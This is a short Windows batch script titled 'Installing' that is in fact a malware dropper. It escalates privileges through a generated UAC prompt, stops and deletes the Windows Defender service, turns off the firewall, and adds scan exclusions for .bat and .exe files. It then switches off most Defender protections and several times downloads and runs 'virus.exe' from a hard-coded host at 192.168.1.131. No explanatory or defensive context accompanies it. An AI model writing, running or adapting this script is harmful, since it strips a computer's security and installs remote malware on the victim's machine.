@echo off>NUL
title Installing
REM  
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM 
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
sc stop  windefend 
sc delete  windefend
netsh firewall set opmode mode=disable
powershell.exe -command "iwr http://192.168.1.131:443/virus.exe -OutFile .\virus.exe"
powershell.exe -command ".\virus.exe"
powershell.exe -command ".\virus.exe"
powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
cd C:\WINDOWS\System32
powershell.exe -command "iwr http://192.168.1.131:443/virus.exe -OutFile .\virus.exe"
powershell.exe -command ".\virus.exe"
powershell.exe -command ".\virus.exe"
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell.exe -command "netsh advfirewall set allprofiles state off"
powershell.exe -command "netsh advfirewall set allprofiles state off"
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"
powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell.exe -command "iwr http://192.168.1.131:443/virus.exe -OutFile .\virus.exe"
powershell.exe -command ".\virus.exe"
powershell.exe -command ".\virus.exe"
sc stop  windefend 
sc delete  windefend